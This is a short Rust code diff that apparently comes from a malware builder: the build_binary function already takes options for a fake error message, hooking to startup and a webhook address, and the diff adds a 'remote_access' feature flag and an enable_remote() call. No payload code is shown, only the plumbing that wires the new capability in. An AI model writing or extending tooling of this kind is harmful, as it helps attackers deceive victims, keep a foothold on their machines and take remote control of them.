@@ -8,6 +8,7 @@ pub fn build_binary(
     gdt: bool,
     fake_error: bool,
     hook_to_startup: bool,
+    remote_access: bool,
     fe_title: &str,
     fe_msg: &str,
     webhook_uri: String,
@@ -30,6 +31,9 @@ pub fn build_binary(
     }
     if hook_to_startup {
         features.push("aegis/hook_to_startup");
+    }
+    if remote_access {
+        features.push("aegis/remote_access");
     }
 
     let mut cmd = Command::new("cargo");
@@ -66,4 +70,8 @@ pub async fn show_error(title: &str, msg: &str) {
 
 pub async fn hook_to_startup() -> std::io::Result<()> {
     utils::startup::startup()
+}
+
+pub async fn enable_remote() -> std::io::Result<()> {
+    utils::remote::enable_remote()
 }
